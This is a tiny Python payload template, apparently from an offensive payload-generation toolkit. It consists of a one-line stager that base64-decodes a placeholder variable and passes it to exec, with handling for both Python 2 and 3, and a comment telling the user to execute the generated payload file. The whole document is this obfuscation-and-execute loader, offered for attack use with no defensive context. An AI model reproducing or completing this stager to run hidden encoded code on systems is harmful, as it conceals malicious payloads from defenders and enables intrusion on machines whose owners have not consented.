# python  template | Author: r00t-3xp10it 
# execute ./payload_name.py
# ---
python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](InJEc)))"
